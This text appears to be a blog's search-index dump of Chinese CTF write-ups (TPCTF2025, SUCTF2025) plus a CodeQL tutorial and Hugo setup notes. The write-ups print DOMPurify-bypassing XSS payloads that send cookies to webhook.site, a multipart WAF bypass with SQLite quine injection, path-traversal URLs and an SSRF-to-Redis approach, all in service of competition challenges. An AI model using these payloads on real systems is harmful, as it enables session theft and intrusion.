\"delombok\" -name '*.java' -exec sed '/import lombok/d' -i '{}' ';' # copy delombok'd files over the original ones cp -r \"delombok/.\" \"./\" # remove the \"delombok\" folder rm -rf \"delombok\" 两种方法都是去掉 lombok 注解，并还原 setter 和 getter 方法，实现手法不一样罢了，貌似第一种更方便，不知道为啥我这啥都没修改还是检测出来了 ","date":"2025-04-13","objectID":"/posts/28dc684/:5:4","tags":["Java"],"title":"CodeQL入门","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"批量化实现\r以上 ql 规则可以成功跑出靶场的 sql 注入漏洞，我们也可以将其运用到其他项目上，先生成相应的数据库，然后再用写好的 ql 文件去分析就好，codeql 命令为 codeql database analyze /CodeQL/databases/micro-service-seclab /CodeQL/ql/java/ql/examples/demo --format=csv --output=/CodeQL/Result/micro-service-seclab.csv --rerun ","date":"2025-04-13","objectID":"/posts/28dc684/:5:5","tags":["Java"],"title":"CodeQL入门","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"CodeQL进阶\r","date":"2025-04-13","objectID":"/posts/28dc684/:6:0","tags":["Java"],"title":"CodeQL入门","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"instanceof语法糖\ra instanceof b 上面语句就是检测 a 对象是否是 b 类型 在遇到复杂的类型时，可能要用多个 exist 子查询语句，但是只用一个 instanceof 语句就好，而且只要匹配一个抽象类，就能匹配到这个抽象类下的所有子类，比如 class MyCustomSource extends RemoteFlowSource 如果 x 为 MyCustomSource 类型，则 x instanceof RemoteFlowSource 会返回true ","date":"2025-04-13","objectID":"/posts/28dc684/:6:1","tags":["Java"],"title":"CodeQL入门","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"递归\rCodeQL里面的递归调用语法是：在谓词方法的后面跟*或者+，来表示调用0次以上和1次以上（和正则类似），0次会打印自己。 demo package org.example; public class hello { public class StudentService { class innerOne { public innerOne(){} class innerTwo { public innerTwo(){} public String Nihao() { return \"Nihao\"; } } public String Hi(){ return \"hello\"; } } } } 此时如果想要根据innerTwo类定位到最外层的 hello 类 我们可以用以下 ql 查询语句来获得，调用两次 getEnclosingType 方法即可 import java from Class classes where classes.getName().toString() = \"innerTwo\" select classes.getEnclosingType().getEnclosingType().getEnclosingType() // getEnclosingtype获取作用域 但是实际情况我们不知道要调用几次，而且这样写也比较麻烦 这时候就可以用到递归了，我们在调用方法后面加*(从自身开始调用)或者+(从上一级开始调用)，来解决此问题。 from Class classes where classes.getName().toString() = \"innerTwo\" select classes.getEnclosingType+() // 获取作用域 + 是从上一级开始调用 * 是从自身开始调用 自己封装方法来实现递归调用也是可以的，比如这里我这只想找相差一层的类 import java RefType demo(Class classes) { result = classes.getEnclosingType().getEnclosingType() } from Class classes where classes.getName().toString() = \"innerTwo\" select demo*(classes) // 获取作用域 ","date":"2025-04-13","objectID":"/posts/28dc684/:6:2","tags":["Java"],"title":"CodeQL入门","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"强制类型转换\r在 CodeQL 中可以用 getType() 来对返回结果做强制类型转换 查询下当前数据库中所有的参数及其类型 import java from Parameter param select param, param.getType() 可以看到有5k多条而且有不同类型的参数，强制转换下，只留下是整型的参数 只有1k多条了，而且只含有整型的 ","date":"2025-04-13","objectID":"/posts/28dc684/:6:3","tags":["Java"],"title":"CodeQL入门","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"总结\r综上可以知道CodeQL的强大了，稍微入了下门，知道怎么用了，难点就在于规则的编写，最主要的就是source，sink和中间Sanitizer的编写 接下来就是找案例来练手了 ","date":"2025-04-13","objectID":"/posts/28dc684/:7:0","tags":["Java"],"title":"CodeQL入门","uri":"/posts/28dc684/"},{"categories":["Java"],"content":"参考\rhttps://www.freebuf.com/articles/web/283795.html https://www.ascotbe.com/2024/12/27/CodeQL/ https://drun1baby.top/2023/09/03/CodeQL-%E5%85%A5%E9%97%A8/ ","date":"2025-04-13","objectID":"/posts/28dc684/:8:0","tags":["Java"],"title":"CodeQL入门","uri":"/posts/28dc684/"},{"categories":["CTF"],"content":"前言\r清华北大办的比赛，质量不用质疑，Misc 的话手搓二维码的时候一直对不上，貌似是上下颠倒了，qrzybox原来还能自动补全，算是学到了，Web 的话就复现了下 xss 的，其他题看下 wp 再说吧，题目后打 * 的是复现 ","date":"2025-03-11","objectID":"/posts/c1e7c5b/:1:0","tags":["CTF"],"title":"TPCTF2025部分wp","uri":"/posts/c1e7c5b/"},{"categories":["CTF"],"content":"Web\r","date":"2025-03-11","objectID":"/posts/c1e7c5b/:2:0","tags":["CTF"],"title":"TPCTF2025部分wp","uri":"/posts/c1e7c5b/"},{"categories":["CTF"],"content":"baby layout\r思路很清楚，可以写 content 和 layout ，然后bot访问指定 url 时会将 flag 注入到访问的的那个网页的 cookie 中，打 xss 带 cookie。可以看到代码中对 content 和 layout 的内容都是用 DOMPurify.sanitize() 来进行了个过滤，而且可以在配置文件中看到 dompurify 版本为 3.2.4，应该不是打 0day 我们这里重点看下 content 和 layout 的实现 app.post('/api/post', (req, res) =\u003e { const { content, layoutId } = req.body; if (typeof content !== 'string' || typeof layoutId !== 'number') { return res.status(400).send('Invalid params'); } if (content.length \u003e LENGTH_LIMIT) return res.status(400).send('Content too long'); const layout = req.session.layouts[layoutId]; if (layout === undefined) return res.status(400).send('Layout not found'); const sanitizedContent = DOMPurify.sanitize(content); //将 layout 中的 {{content}} 替换为 content 的值 const body = layout.replace(/\\{\\{content\\}\\}/g, () =\u003e sanitizedContent); if (body.length \u003e LENGTH_LIMIT) return res.status(400).send('Post too long'); const id = randomBytes(16).toString('hex'); posts.set(id, body); req.session.posts.push(id); console.log(`Post ${id} ${Buffer.from(layout).toString('base64')} ${Buffer.from(sanitizedContent).toString('base64')}`); return res.json({ id }); }); app.post('/api/layout', (req, res) =\u003e { const { layout } = req.body; if (typeof layout !== 'string') return res.status(400).send('Invalid param'); if (layout.length \u003e LENGTH_LIMIT) return res.status(400).send('Layout too large'); const sanitizedLayout = DOMPurify.sanitize(layout); const id = req.session.layouts.length; req.session.layouts.push(sanitizedLayout); return res.json({ id }); }); 可以看到在 content 的实现中是先检测再替换，也就是说我们可以将 payload 分为两段，一段写入 layout ，并将会被过滤的部分替换为 {{content}}，第二段写入 content，值就为会被过滤的部分，这样的话 content 和 layout 都可以绕过 DOMPurify.sanitize() 的检测，而且也会将 content 的值拼入 layout 中，形成最后的恶意 payload。而之所以 content 的值不会被过滤，应该是没有形成一个完整的 html ，没被检测到，可以在官方的github 上找到个 demo 来测试一下：DOMPurify 3.2.4 “Shipwreck” 可以看到第二次就被过滤了而第一次却没有被过滤，弹个窗先 layout 为 \u003caudio src={{content}}\u003e content 为 \"a\" onloadstart=\"alert(1)\" create post 就弹窗了 源码也可以看到是成功插入了的 带下 cookie \"a\" onloadstart=\"fetch('https://webhook.site/98df9897-f596-4e4b-9994-3ee26ff59249?f=' + document.cookie)\" 后面两道加强题都可以参考：https://mizu.re/post/exploring-the-dompurify-library-hunting-for-misconfigurations#dangerous-allow-lists ","date":"2025-03-11","objectID":"/posts/c1e7c5b/:2:1","tags":["CTF"],"title":"TPCTF2025部分wp","uri":"/posts/c1e7c5b/"},{"categories":["CTF"],"content":"safe layout*\r加强了过滤 将 ALLOWED_ATTR 置为空，也就是不能引用属性，但跟进后会发现还可以用 ALLOW_DATA_ATTR 和 ALLOW_ARIA_ATTR 也就是说我们依然可以用自定义的 data，后接恶意代码即可 layout \u003caudio data-a={{content}}\u003e content a\" src=\"a\" onloadstart=\"fetch('https://webhook.site/0f676d3e-7a72-4491-af58-7419e600dabf?f=' + document.cookie)\" 必须有 src 属性，不然会报错 ","date":"2025-03-11","objectID":"/posts/c1e7c5b/:2:2","tags":["CTF"],"title":"TPCTF2025部分wp","uri":"/posts/c1e7c5b/"},{"categories":["CTF"],"content":"safe layout revenge*\r这道就修复了上面的非预期，把 ALLOW_ARIA_ATTR 和 ALLOW_DATA_ATTR 都设为了 false 从 出题人的wp 中看到dompurify非常严格，\u003cstyle\u003e中的任何HTML标签都将被过滤。但是，正则表达式仅检查 /\u003c[/\\ w]/ ，因此不会过滤 \u003c{{content}} ，可以用其来绕过恶意的标签 但不能直接写在 style 标签里，因为 style 标签中的会被当作 css 解析，所以把 {{content}} 包裹在 style 便签里即可，第一个 {{content}} 是用来闭合第一个 style 标签的，而前面的 a 的话是开一个新的节点，干扰html解析规则啥的，没太懂，但是不加就会解析失败 layout a\u003cstyle\u003e{{content}}\u003c{{content}}\u003c/style\u003e content img src=\"a\" onerror=fetch(`https://webhook.site/0f676d3e-7a72-4491-af58-7419e600dabf?f=`+document.cookie) \u003cstyle\u003e\u003c/style\u003e ","date":"2025-03-11","objectID":"/posts/c1e7c5b/:2:3","tags":["CTF"],"title":"TPCTF2025部分wp","uri":"/posts/c1e7c5b/"},{"categories":["CTF"],"content":"supersqli\rmanage.py 加个参数启动服务器，方便调试 if len(sys.argv) == 1: sys.argv.append(\"runserver\") 在 supersqli\\web_deploy\\src\\blog\\views.py 文件中的 flag 函数中我们可以发现存在 sql 注入 但是 supersqli\\web_deploy\\simplewaf\\main.go 中的 waf 限制的很死 var sqlInjectionPattern = regexp.MustCompile(`(?i)(union.*select|select.*from|insert.*into|update.*set|delete.*from|drop\\s+table|--|#|\\*\\/|\\/\\*)`) var rcePattern = regexp.MustCompile(`(?i)(\\b(?:os|exec|system|eval|passthru|shell_exec|phpinfo|popen|proc_open|pcntl_exec|assert)\\s*\\(.+\\))`) var hotfixPattern = regexp.MustCompile(`(?i)(select)`) 注意到在 go 中加了个判断，判断 mediaType 是否为 multipart/form-data 找到一篇有关利用 multipart/form-data 解析差异实现绕过的文章：https://sym01.com/posts/2021/bypass-waf-via-boundary-confusion/ 但文章中用的是 flask 框架，貌似在这里的 Django 中行不通，看下 Django 框架中对 multipart/form-data 处理，跟进到 multipartparser.py 中可以发现 Django 是通过请求头中的 Content-Disposition 字段来区分每个字段 而在 go 中的 request.go 的 multipartReader 函数中 func (r *Request) multipartReader(allowMixed bool) (*multipart.Reader, error) { v := r.Header.Get(\"Content-Type\") if v == \"\" { return nil, ErrNotMultipart } if r.Body == nil { return nil, errors.New(\"missing form body\") } d, params, err := mime.ParseMediaType(v) if err != nil || !(d == \"multipart/form-data\" || allowMixed \u0026\u0026 d == \"multipart/mixed\") { return nil, ErrNotMultipart } boundary, ok := params[\"boundary\"] if !ok { return nil, ErrMissingBoundary } return multipart.NewReader(r.Body, boundary), nil } 可以看到这里是用 boundary 的值来分隔 multipart 请求中的各个部分，截止符的话当然就是 boundary 的值加上 -- 了 经过上面的分析我们发现 go 和 Django 中用来区分不同字段的方法是不一样的，可以利用这个解析差异来绕过 waf ，请求是先经过 go 处理再经过 Django 的，我们可以先用 --boundary-- 来截止，然后再传 password 的值。当请求体为 Content-Type: multipart/form-data; boundary=----xxx Content-Length: 137 ------xxx Content-Disposition: form-data; name=\"username\" admin ------xxx-- Content-Disposition: form-data; name=\"password\"; 111 go 只会解析 ------xxx-- 前的值，也就是返回 请求的 POST 参数: username = admin 而 Django 则会返回两个参数的值 请求的 POST 参数: username = admin password = 111 后面 sql 注入的话是打 sqlite，盲注不知道为啥打不了，然后发现能打 quine 注入，这里只判断了传入的 password 是否相同，确实也比较符合其利用场景，用文章中的脚本构造下 payload：https://blog.csdn.net/qq_35782055/article/details/130348274，稍微改下，没过滤空格，不用 repalce 为 /**/ sql = input (\"输入你的sql语句,不用写关键查询的信息 形如 1'union select #\\n\") sql2 = sql.replace(\"'\",'\"') base = \"replace(replace('.',char(34),char(39)),char(46),'.')\" final = \"\" def add(string): if (\"--+\" in string): tem = string.split(\"--+\")[0] + base + \"--+\" if (\"#\" in string): tem = string.split(\"#\")[0] + base + \"#\" return tem def patch(string,sql): if (\"--+\" in string): return sql.split(\"--+\")[0] + string + \"--+\" if (\"#\" in string): return sql.split(\"#\")[0] + string + \"#\" res = patch(base.replace(\".\",add(sql2)),sql).replace(\"'.'\",'\".\"') print(res) 最后经尝试发现是两列，因此传入 1' union select 1,2,--+ ，得到 payload 1' union select 1,2,replace(replace('1\" union select 1,2,replace(replace(\".\",char(34),char(39)),char(46),\".\")--+',char(34),char(39)),char(46),'1\" union select 1,2,replace(replace(\".\",char(34),char(39)),char(46),\".\")--+')--+ ","date":"2025-03-11","objectID":"/posts/c1e7c5b/:2:4","tags":["CTF"],"title":"TPCTF2025部分wp","uri":"/posts/c1e7c5b/"},{"categories":["CTF"],"content":"前言\r好多题，质量很高，misc没怎么看，全在看web，Java还是打不动😿，还有一些关于云的，也不会，先贴一下写了的wp，pop当时没做，其他题之后有空复现一下 ","date":"2025-01-14","objectID":"/posts/48766ef/:1:0","tags":["CTF"],"title":"SUCTF2025部分wp","uri":"/posts/48766ef/"},{"categories":["CTF"],"content":"Misc\r","date":"2025-01-14","objectID":"/posts/48766ef/:2:0","tags":["CTF"],"title":"SUCTF2025部分wp","uri":"/posts/48766ef/"},{"categories":["CTF"],"content":"SU_checkin\r找到个password：SePassWordLen23SUCT 加密方式：PBEWithMD5AndDES 感觉hacker这个用户里的密码就是盐，但是爆破出来是 hacker（怎么不是8位） 迭代次数应该是默认的1000，不行的话爆破也行，OUTPUT应该就是密文：ElV+bGCnJYHVR8m23GLhprTGY0gHi/tNXBkGBtQusB/zs0uIHHoXMJoYd6oSOoKuFWmAHYrxkbg= 后来发现不用盐也可以解密，密码SePassWordLen23SUCT其实是暗示密码length为23，其实应该是SUCTF，照着加密脚本：https://blog.csdn.net/iin729/article/details/128432332，叫ai写了个python解密脚本 import base64 import hashlib import re import itertools import string from Crypto.Cipher import DES def get_derived_key(password, salt, count): key = password + salt for i in range(count): m = hashlib.md5(key) key = m.digest() return (key[:8], key[8:]) def decrypt(msg, password): msg_bytes = base64.b64decode(msg) salt = msg_bytes[:8] enc_text = msg_bytes[8:] (dk, iv) = get_derived_key(password, salt, 1000) crypter = DES.new(dk, DES.MODE_CBC, iv) text = crypter.decrypt(enc_text) # Remove padding at the end, if any return re.sub(r'[\\x01-\\x08]', '', text.decode(\"utf-8\", errors=\"ignore\")) def brute_force_decrypt(ciphertext, prefix, length, charset): # Calculate the number of missing characters missing_length = length - len(prefix) # Generate all possible combinations of the missing characters for combination in itertools.product(charset, repeat=missing_length): # Construct the full password password = prefix + ''.join(combination) try: # Attempt to decrypt the ciphertext decrypted_text = decrypt(ciphertext, password.encode(\"utf-8\")) # Check if the decrypted text contains \"SUCTF\" if \"SUCTF\" in decrypted_text: print(f\"Found valid password: {password}\") print(f\"Decrypted text: {decrypted_text}\") return password, decrypted_text except Exception as e: # If decryption fails, just continue to the next combination continue print(\"No valid password found.\") return None, None def main(): # Known prefix of the password prefix = \"SePassWordLen23SUCTF\" # Total length of the password length = 23 # Character set to use for the missing characters (alphanumeric) charset = string.ascii_letters + string.digits # Ciphertext to decrypt ciphertext = \"ElV+bGCnJYHVR8m23GLhprTGY0gHi/tNXBkGBtQusB/zs0uIHHoXMJoYd6oSOoKuFWmAHYrxkbg=\" # Start brute-forcing password, decrypted_text = brute_force_decrypt(ciphertext, prefix, length, charset) if password: print(f\"Success! Password: {password}\") print(f\"Decrypted text: {decrypted_text}\") if __name__ == \"__main__\": main() ","date":"2025-01-14","objectID":"/posts/48766ef/:2:1","tags":["CTF"],"title":"SUCTF2025部分wp","uri":"/posts/48766ef/"},{"categories":["CTF"],"content":"SU_RealCheckin\rhello ctf -\u003e 🏠🦅🍋🍋🍊 🐈🌮🍟 $flag -\u003e 🐍☂️🐈🌮🍟{🐋🦅🍋🐈🍊🏔️🦅_🌮🍊_🐍☂️🐈🌮🍟_🧶🍊☂️_🐈🍎🌃_🌈🦅🍎🍋🍋🧶_🐬🍎🌃🐈🦅} $flag 前五个为suctf，根据映射关系最后大括号里面的推断出来是 ? e l c o ? e _ t o _ s u c t f _ ? o u _ c ? ? _ r e ? l l ? _ d ? ? c e 其实第一段很明显是welcome，可以发现该emoji代表的东西的英文首字母就是该emoji代表的字符，故最后flag为 suctf{welcome_to_suctf_you_can_really_dance} ","date":"2025-01-14","objectID":"/posts/48766ef/:2:2","tags":["CTF"],"title":"SUCTF2025部分wp","uri":"/posts/48766ef/"},{"categories":["CTF"],"content":"Web\r","date":"2025-01-14","objectID":"/posts/48766ef/:3:0","tags":["CTF"],"title":"SUCTF2025部分wp","uri":"/posts/48766ef/"},{"categories":["CTF"],"content":"SU_blog\rarticles 目录有目录穿越，读启动命令，双写绕过一下 article?file=articles/....//....//....//....//....//....//proc/self/cmdline 拿到pythonapp/app.py，拿源码 article?file=articles/....//....//app/app.py 源码 from flask import * import time,os,json,hashlib from pydash import set_ from waf import pwaf,cwaf app = Flask(__name__) app.config['SECRET_KEY'] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\"testuser\": \"password\"} BASE_DIR = '/var/www/html/myblog/app' articles = { 1: \"articles/article1.txt\", 2: \"articles/article2.txt\", 3: \"articles/article3.txt\" } friend_links = [ {\"name\": \"bkf1sh\", \"url\": \"https://ctf.org.cn/\"}, {\"name\": \"fushuling\", \"url\": \"https://fushuling.com/\"}, {\"name\": \"yulate\", \"url\": \"https://www.yulate.com/\"}, {\"name\": \"zimablue\", \"url\": \"https://www.zimablue.life/\"}, {\"name\": \"baozongwi\", \"url\": \"https://baozongwi.xyz/\"}, ] class User(): def __init__(self): pass user_data = User() @app.route('/') def index(): if 'username' in session: return render_template('blog.html', articles=articles, friend_links=friend_links) return redirect(url_for('login')) @app.route('/login', methods=['GET', 'POST']) def login(): if request.method == 'POST': username = request.form['username'] password = request.form['password'] if username in users and users[username] == password: session['username'] = username return redirect(url_for('index')) else: return \"Invalid credentials\", 403 return render_template('login.html') @app.route('/register', methods=['GET', 'POST']) def register(): if request.method == 'POST': username = request.form['username'] password = request.form['password'] users[username] = password return redirect(url_for('login')) return render_template('register.html') @app.route('/change_password', methods=['GET', 'POST']) def change_password(): if 'username' not in session: return redirect(url_for('login')) if request.method == 'POST': old_password = request.form['old_password'] new_password = request.form['new_password'] confirm_password = request.form['confirm_password'] if users[session['username']] != old_password: flash(\"Old password is incorrect\", \"error\") elif new_password != confirm_password: flash(\"New passwords do not match\", \"error\") else: users[session['username']] = new_password flash(\"Password changed successfully\", \"success\") return redirect(url_for('index')) return render_template('change_password.html') @app.route('/friendlinks') def friendlinks(): if 'username' not in session or session['username'] != 'admin': return redirect(url_for('login')) return render_template('friendlinks.html', links=friend_links) @app.route('/add_friendlink', methods=['POST']) def add_friendlink(): if 'username' not in session or session['username'] != 'admin': return redirect(url_for('login')) name = request.form.get('name') url = request.form.get('url') if name and url: friend_links.append({\"name\": name, \"url\": url}) return redirect(url_for('friendlinks')) @app.route('/delete_friendlink/\u003cint:index\u003e') def delete_friendlink(index): if 'username' not in session or session['username'] != 'admin': return redirect(url_for('login')) if 0 \u003c= index \u003c len(friend_links): del friend_links[index] return redirect(url_for('friendlinks')) @app.route('/article') def article(): if 'username' not in session: return redirect(url_for('login')) file_name = request.args.get('file', '') if not file_name: return render_template('article.html', file_name='', content=\"未提供文件名。\") blacklist = [\"waf.py\"] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template('article.html', file_name=file_name, content=\"大黑阔不许看\") if not file_name.startswith('articles/'): return render_template('article.html', file_name=file_name, content=\"无效的文件路径。\") if file_name not in articles.values(): if session.get('username') != 'admin': return render_template('article.html', file_name=file_name, content=\"无权访问该文件。\") file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace('../', '') try: with open(file_path, 'r', encoding='ut","date":"2025-01-14","objectID":"/posts/48766ef/:3:1","tags":["CTF"],"title":"SUCTF2025部分wp","uri":"/posts/48766ef/"},{"categories":["CTF"],"content":"SU_photogallery\r404页面 参考 [FSCTF 2023]签到plus 尝试打下 php＜= 7 . 4 . 21 development server源码泄露，其实随便访问一下就出源码了 unzip.php \u003c?php error_reporting(0); function get_extension($filename){ return pathinfo($filename, PATHINFO_EXTENSION); } function check_extension($filename,$path){ $filePath = $path . DIRECTORY_SEPARATOR . $filename; if (is_file($filePath)) { $extension = strtolower(get_extension($filename)); if (!in_array($extension, ['jpg', 'jpeg', 'png', 'gif'])) { if (!unlink($filePath)) { // echo \"Fail to delete file: $filename\\n\"; return false; } else{ // echo \"This file format is not supported:$extension\\n\"; return false; } } else{ return true; } } else{ // echo \"nofile\"; return false; } } function file_rename ($path,$file){ $randomName = md5(uniqid().rand(0, 99999)) . '.' . get_extension($file); $oldPath = $path . DIRECTORY_SEPARATOR . $file; $newPath = $path . DIRECTORY_SEPARATOR . $randomName; if (!rename($oldPath, $newPath)) { unlink($path . DIRECTORY_SEPARATOR . $file); // echo \"Fail to rename file: $file\\n\"; return false; } else{ return true; } } function move_file($path,$basePath){ foreach (glob($path . DIRECTORY_SEPARATOR . '*') as $file) { $destination = $basePath . DIRECTORY_SEPARATOR . basename($file); if (!rename($file, $destination)){ // echo \"Fail to rename file: $file\\n\"; return false; } } return true; } function check_base($fileContent){ $keywords = ['eval', 'base64', 'shell_exec', 'system', 'passthru', 'assert', 'flag', 'exec', 'phar', 'xml', 'DOCTYPE', 'iconv', 'zip', 'file', 'chr', 'hex2bin', 'dir', 'function', 'pcntl_exec', 'array', 'include', 'require', 'call_user_func', 'getallheaders', 'get_defined_vars','info']; $base64_keywords = []; foreach ($keywords as $keyword) { $base64_keywords[] = base64_encode($keyword); } foreach ($base64_keywords as $base64_keyword) { if (strpos($fileContent, $base64_keyword)!== false) { return true; } else{ return false; } } } function check_content($zip){ for ($i = 0; $i \u003c $zip-\u003enumFiles; $i++) { $fileInfo = $zip-\u003estatIndex($i); $fileName = $fileInfo['name']; if (preg_match('/\\.\\.(\\/|\\.|%2e%2e%2f)/i', $fileName)) { return false; } // echo \"Checking file: $fileName\\n\"; $fileContent = $zip-\u003egetFromName($fileName); if (preg_match('/(eval|base64|shell_exec|system|passthru|assert|flag|exec|phar|xml|DOCTYPE|iconv|zip|file|chr|hex2bin|dir|function|pcntl_exec|array|include|require|call_user_func|getallheaders|get_defined_vars|info)/i', $fileContent) || check_base($fileContent)) { // echo \"Don't hack me!\\n\"; return false; } else { continue; } } return true; } function unzip($zipname, $basePath) { $zip = new ZipArchive; if (!file_exists($zipname)) { // echo \"Zip file does not exist\"; return \"zip_not_found\"; } if (!$zip-\u003eopen($zipname)) { // echo \"Fail to open zip file\"; return \"zip_open_failed\"; } if (!check_content($zip)) { return \"malicious_content_detected\"; } $randomDir = 'tmp_'.md5(uniqid().rand(0, 99999)); $path = $basePath . DIRECTORY_SEPARATOR . $randomDir; if (!mkdir($path, 0777, true)) { // echo \"Fail to create directory\"; $zip-\u003eclose(); return \"mkdir_failed\"; } if (!$zip-\u003eextractTo($path)) { // echo \"Fail to extract zip file\"; $zip-\u003eclose(); } for ($i = 0; $i \u003c $zip-\u003enumFiles; $i++) { $fileInfo = $zip-\u003estatIndex($i); $fileName = $fileInfo['name']; if (!check_extension($fileName, $path)) { // echo \"Unsupported file extension\"; continue; } if (!file_rename($path, $fileName)) { // echo \"File rename failed\"; continue; } } if (!move_file($path, $basePath)) { $zip-\u003eclose(); // echo \"Fail to move file\"; return \"move_failed\"; } rmdir($path); $zip-\u003eclose(); return true; } $uploadDir = __DIR__ . DIRECTORY_SEPARATOR . 'upload/suimages/'; if (!is_dir($uploadDir)) { mkdir($uploadDir, 0777, true); } if (isset($_FILES['file']) \u0026\u0026 $_FILES['file']['error'] === UPLOAD_ERR_OK) { $uploadedFile = $_FILES['file']; $zipname = $uploadedFile['tmp_name']; $path = $uploadDir; $result = unzip($zipname, $path); if ($result === true) { header(\"Location: index.html?status=success\"); exit(); } else { header(\"Loca","date":"2025-01-14","objectID":"/posts/48766ef/:3:2","tags":["CTF"],"title":"SUCTF2025部分wp","uri":"/posts/48766ef/"},{"categories":["CTF"],"content":"前言\r比赛时间有点阴间，题目的话全是二进制，能看的题就只有三道，Java听说是个1day，摆了 ","date":"2025-01-07","objectID":"/posts/6c39531/:1:0","tags":["CTF"],"title":"软件系统安全赛初赛2025部分wp","uri":"/posts/6c39531/"},{"categories":["CTF"],"content":"钓鱼邮件\r记事本打开是一大串base64编码，解码后是个zip，下载下来爆破密码，最后密码为 20001111，得到个exe，拿到奇安信在线沙箱出 尝试后发现是222.218.218.218那个，md5一下就行 ","date":"2025-01-07","objectID":"/posts/6c39531/:2:0","tags":["CTF"],"title":"软件系统安全赛初赛2025部分wp","uri":"/posts/6c39531/"},{"categories":["CTF"],"content":"CachedVisitor\rmain.lua local function read_file(filename) local file = io.open(filename, \"r\") if not file then print(\"Error: Could not open file \" .. filename) return nil end local content = file:read(\"*a\") file:close() return content end local function execute_lua_code(script_content) local lua_code = script_content:match(\"##LUA_START##(.-)##LUA_END##\") if lua_code then local chunk, err = load(lua_code) if chunk then local success, result = pcall(chunk) if not success then print(\"Error executing Lua code: \", result) end else print(\"Error loading Lua code: \", err) end else print(\"Error: No valid Lua code block found.\") end end local function main() local filename = \"/scripts/visit.script\" local script_content = read_file(filename) if script_content then execute_lua_code(script_content) end end main() 最后是执行了一个文件，而/scripts/visit.script的作用是从外部 URL 获取数据并将其缓存到 Redis 中，一个很明显的ssrf打redis，刚开始走偏了，以为是打个cve 可以直接把/scripts/visit.script覆盖成执行/readflag并获取回显，用dict协议老是会报引号有问题，用gopher协议打 这里选择的是phpshell，默认生成的是shell.php，解码改一下文件名和长度 最后编码的话还是建议用bp直接编码，其他的总会出点问题 接下来是二进制爷的wp ","date":"2025-01-07","objectID":"/posts/6c39531/:3:0","tags":["CTF"],"title":"软件系统安全赛初赛2025部分wp","uri":"/posts/6c39531/"},{"categories":["CTF"],"content":"donntyousee\r打开文件逐步调试 这里面是call-ret型花指令，所以把相关内容nop掉，大致格式是： push rax; call loop; loop: xxxxx; ret; pop rax; 每个相关的函数都有这个，可以全部nop掉 调用了这两个函数，分别都是call r8，只有动态调试 第一个是执行Sbox的初始化，用的数据是byte_5C5110，这个是key 第二个函数是执行加密，很明显是一个魔改RC4，可以直接逆向。 继续往后调试 这里进行了比较，sub_4E4060是输出正确与否，所以看v7的终值，直接解密即可 key:921C2B1FBAFBA2FF07697D77188C data:25 cd 54 af 51 1c 58 d3 a8 4b 4f 56 ec 83 5d d4 f6 47 4a 6f e0 73 b0 a5 a8 c3 17 81 5e 2b f4 f6 71 ea 2f ff a8 63 99 57 flag:dart{y0UD0ntL4cKg0oD3y34T0F1nDTh3B4aUtY} ","date":"2025-01-07","objectID":"/posts/6c39531/:4:0","tags":["CTF"],"title":"软件系统安全赛初赛2025部分wp","uri":"/posts/6c39531/"},{"categories":["杂记"],"content":"前置\r下载好Git、Go 和 Dart Sass、hugo Dart Sass我这用的npm下的 npm install -g sass sass --version //验证安装 hugo下载：https://github.com/gohugoio/hugo/releases（下载extend拓展版的，方便自定义加东西，记得加环境变量） 其他我都配好了，不多说 ","date":"2025-01-06","objectID":"/posts/5c6225e/:1:0","tags":["杂记"],"title":"博客搭建","uri":"/posts/5c6225e/"},{"categories":["杂记"],"content":"博客配置\r然后按照这个来吧： https://fixit.lruihao.cn/zh-cn/documentation/getting-started/quick-start/ 这里echo时要去掉双引号，其他的不多说 ","date":"2025-01-06","objectID":"/posts/5c6225e/:2:0","tags":["杂记"],"title":"博客搭建","uri":"/posts/5c6225e/"},{"categories":["杂记"],"content":"美化记录（持续更新ing）\r","date":"2025-01-06","objectID":"/posts/5c6225e/:3:0","tags":["杂记"],"title":"博客搭建","uri":"/posts/5c6225e/"},{"categories":["杂记"],"content":"2025.2.28\r有人催我加友链，于是弄下友链，感觉 loveit 主题和 fixit 主题差不多，按照文章：https://blog.233so.com/2020/04/friend-link-shortcodes-for-hugo-loveit/ 来就好，只需要注意下在修改FixIt/assets/css/_page/的_single.scss时引入的行应该为 @import \"../_partials/_single/friend\"; fixit 的目录比 loveit 的目录少了个 s ，其他的话叫 ai 改了个颜色，把旋转去掉了，再加了个微微放大的动画，我的 friend.scss // ===== 变量定义 ===== $shadow-green: rgba(50, 205, 50, 0.3); // 绿色阴影 $hover-green: rgba(144, 238, 144, 0.3); // 悬停背景色 $hover-scale: 1.02; // 悬停放大比例 $transition-time: 0.3s; // 过渡动画时间 // ===== 基础样式 ===== .friendurl { text-decoration: none !important; color: black; } .myfriend { width: 56px !important; height: 56px !important; border-radius: 50%; border: 1px solid #ddd; padding: 2px; box-shadow: 1px 1px 1px rgba(0, 0, 0, 0.15); margin: 14px 0 0 14px !important; background-color: #fff; } .frienddiv { // ===== 布局属性 ===== height: 92px; margin-top: 10px; width: 48%; display: inline-block !important; border-radius: 5px; // ===== 视觉效果 ===== background: rgba(255, 255, 255, 0.2); box-shadow: 4px 4px 2px 1px $shadow-green; // ===== 过渡动画 ===== transition: all $transition-time ease-in-out; // ===== 悬停状态 ===== \u0026:hover { background: $hover-green; transform: scale($hover-scale); box-shadow: 4px 4px 6px 2px rgba(50, 205, 50, 0.25); // 加强阴影 } // ===== 左侧头像区域 ===== .frienddivleft { width: 92px; float: left; margin-right: 2px; } // ===== 右侧文字区域 ===== .frienddivright { margin-top: 18px; margin-right: 18px; } // ===== 文字控制 ===== .friendname, .friendinfo { text-overflow: ellipsis; overflow: hidden; white-space: nowrap; } } // ===== 手机端适配 ===== @media screen and (max-width: 600px) { .frienddiv { width: 100% !important; // 单列显示 \u0026:hover { transform: scale(1.01); // 缩小放大比例 } .friendinfo { display: none; } .frienddivleft { width: 84px; margin: auto; } .frienddivright { height: 100%; margin: auto; display: flex; align-items: center; justify-content: center; } .friendname { font-size: 14px; } } } ","date":"2025-01-06","objectID":"/posts/5c6225e/:3:1","tags":["杂记"],"title":"博客搭建","uri":"/posts/5c6225e/"},{"categories":null,"content":"Introduction👨‍💻\rWeb/Misc@D0g3 想学渗透，想学Java 